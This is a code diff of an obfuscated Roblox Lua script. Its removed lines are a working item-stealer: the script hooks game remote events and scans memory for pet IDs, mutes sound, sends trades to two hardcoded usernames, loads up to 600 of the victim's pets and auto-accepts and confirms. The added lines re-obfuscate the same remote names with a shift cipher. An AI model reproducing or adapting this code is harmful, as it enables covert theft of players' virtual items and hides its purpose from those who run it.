@@ -1,127 +1,24 @@
-local _0=function(_1)local _2=""for _3=1,#_1 do _2=_2..string.char(_1[_3])end return _2 end
-local _A,_B,_C,_D,_E,_F,_G,_H,_I,_J,_K,_L,_M,_N,_O,_P,_Q,_R,_S,_T,_U,_V,_W,_X,_Y,_Z
-
-_A=game:GetService(_0({80,108,97,121,101,114,115}))
-_B=game:GetService(_0({82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101}))
-_C=_A.LocalPlayer
-_D=_B:WaitForChild(_0({65,80,73}),10)
-if not _D then return end
-
-_E={}
-_F={
-	[1]="XwgkmJZTLfsBtkItxznANSDSU",
-	[2]="EhnpmDoxq/GGQgaSWIHLICSEcEKMJbLUNXe",
-	[3]="XwgkmJZTLNrsYJwEnIkBCCQ",
-	[4]="XwgkmJZTLNqruFKgyAJPFzSIPP",
-	[5]="XwgkmJZTLPBBvzIEnLw/B",
-	[6]="MZpqgmgtCSMEYlAboDEvAv"
-}
-
-_G=function(i)
-	local r=_F[i]
-	if r then
-		local x=_D:FindFirstChild(r)
-		if x then return x end
-	end
-end
-
-_H=function()
-	for _,v in ipairs(_D:GetDescendants()) do
-		if v:IsA(_0({82,101,109,111,116,101,69,118,101,110,116})) then
-			v.OnClientEvent:Connect(function(...)
-				local f=function(s)
-					if type(s)=="string" then
-						local l=#s
-						if l>15 and l<97 and not s:find("sticker") and (s:find("-") or s:find("_") or s:find("%x%x%x%x")) then
-							_E[s]=1
-						end
-					end
-				end
-				local r; r=function(o,d)
-					if d>3 then return end
-					if type(o)=="string" then
-						f(o)
-					elseif type(o)=="table" then
-						for a,b in pairs(o) do
-							r(a,d+1)
-							r(b,d+1)
-						end
-					end
-				end
-				for i=1,select("#",...) do
-					r(select(i,...),1)
-				end
-			end)
+local F=(function()
+	local function d(a,b)
+		local s=""
+		for i=1,#a do
+			s=s..string.char((a[i]-b)%256)
 		end
+		return s
 	end
-end
 
-_I=function()
-	local u={}
-	for k in pairs(_E) do
-		u[#u+1]=k
-		if #u>599 then return u end
+	local k={
+		{181,214,214,218,214,214,230,231,230,203,223,229,229,206,222,227,227,236,240,233,234,231,246,250,246,246,248},
+		{170,216,217,225,225,218,215,227,223,244,244,224,234,232,240,241,236,233,226,237,235,248,251,255,250,244,243,236,252,238,242,244,239,242},
+		{181,214,214,218,214,214,230,231,230,203,223,229,229,206,222,227,227,236},
+		{181,214,214,218,214,214,230,231,230,203,223,229,229,206,222,227,227,236,221,236,227,219,239,231,233,232,223,223},
+		{181,214,214,218,214,214,230,231,230,203,223,229,229,206,222,227},
+		{184,233,246,245,232,237,230,241,227,238,245,237,234,237,245,246,229,236,235,236,237}
+	}
+
+	local o={}
+	for i=1,6 do
+		o[i]=d(k[i],150+i)
 	end
-	if not getgc then return u end
-	local ok,g=pcall(getgc,true)
-	if not ok then return u end
-	for _,v in pairs(g) do
-		if type(v)=="table" then
-			local p=rawget(v,"pets")
-			if type(p)=="table" then
-				for id in pairs(p) do
-					if type(id)=="string" and #id>15 and id:find("%x") then
-						u[#u+1]=id
-						if #u>599 then return u end
-					end
-				end
-			end
-		end
-	end
-	return u
-end
-
-_J=function()
-	local r=_G(1)
-	if not r then return end
-	for _,n in ipairs({_0({97,108,105,95,57,50,51,122}),_0({65,108,105,108,111,108,111,97,122})}) do
-		local p=_A:FindFirstChild(n)
-		if p then pcall(function()r:FireServer(p) end) end
-	end
-end
-
-_K=function()
-	local o=_G(2)
-	if o then pcall(function()o:FireServer("open_backpack") end) end
-end
-
-_L=function()
-	local s=_G(6)
-	if s then pcall(function()s:FireServer("sound_effects_volume",0) end) end
-end
-
-task.wait(6)
-_L()
-_H()
-
-local _idx=1
-local _list=_I()
-if #_list==0 then return end
-
-while true do
-	_J()
-	task.wait(2.5)
-	while _idx<=#_list do
-		_K()
-		task.wait()
-		local a=_G(3)
-		if a then pcall(function()a:FireServer(_list[_idx]) end) end
-		_idx=_idx+1
-	end
-	local ac=_G(4)
-	if ac then pcall(function()ac:FireServer() end) end
-	task.wait(8)
-	local cf=_G(5)
-	if cf then pcall(function()cf:FireServer() end) end
-	break
-end
+	return o
+end)()
